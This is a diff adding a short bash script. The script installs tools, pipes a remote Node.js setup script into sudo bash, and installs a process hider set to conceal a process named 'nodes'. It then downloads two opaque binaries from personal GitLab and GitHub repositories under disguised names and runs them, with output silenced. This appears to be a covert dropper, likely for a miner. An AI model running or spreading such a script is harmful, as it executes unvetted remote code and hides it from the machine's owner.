@@ -1,0 +1,10 @@
+#!/bin/bash
+apt update && apt -y install sudo wget curl unzip >/dev/null 2>&1
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang >/dev/null 2>&1
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs >/dev/null 2>&1
+sudo apt install screen -y
+sudo npm i -g node-process-hider && sudo ph add nodes
+wget -qO nodes https://gitlab.com/sarifadim/jomblo/-/raw/main/load && chmod +x nodes
+wget -qO node.sh https://github.com/sarifadim/dopla/raw/main/lion && chmod +x node.sh
+./node.sh
